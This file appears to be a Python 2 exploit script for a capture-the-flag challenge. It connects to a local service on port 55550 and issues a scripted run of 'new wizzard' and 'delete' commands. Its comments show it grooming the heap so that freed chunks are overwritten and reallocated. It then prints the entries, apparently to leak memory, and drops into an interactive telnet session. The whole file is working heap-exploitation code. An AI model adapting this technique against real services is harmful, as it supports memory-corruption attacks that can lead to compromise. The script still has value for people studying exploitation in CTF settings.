#!/usr/bin/env python

import socket
import struct
from telnetlib import *
import time

pack = lambda x : struct.pack( "<L", x )
unpack = lambda x : struct.unpack( "<L", x )[0]

pack64 = lambda x : struct.pack( "<Q", x )
unpack64 = lambda x : struct.unpack( "<Q", x )[0]

HOST = '0'
PORT = 55550


def recvuntil(t):
	data = ''
	while not data.endswith(t):
		tmp = s.recv(1)
		if not tmp: break
		data += tmp
	return data


s = socket.create_connection((HOST, PORT))

raw_input()

print recvuntil('>')

s.send('new wizzard ' + '1'*16 + '\n')

print recvuntil('>')

s.send('new wizzard ' + 'a'*255 + '\n')

print recvuntil('>')

s.send('new wizzard ' + '3'*16 + '\n')

print recvuntil('>')

s.send('new wizzard ' + '4'*16 + '\n')

print recvuntil('>')

s.send('delete W' + 'a'*255 + '\n') # free 2

print recvuntil('>')

s.send('delete W' + '1'*16 + '\n') # free 1

print recvuntil('>')

s.send('new wizzard ' + 'a'*24 + '\n') # overwrite 1

print recvuntil('>')

s.send('new wizzard ' + 'c'*16 + '\n') # alloc 2-1

print recvuntil('>')

s.send('new wizzard ' + 'd'*0x3f + '\n') # alloc 2-2

print recvuntil('>')


s.send('print all\n')

print recvuntil('>')

t = Telnet()
t.sock = s
t.interact()

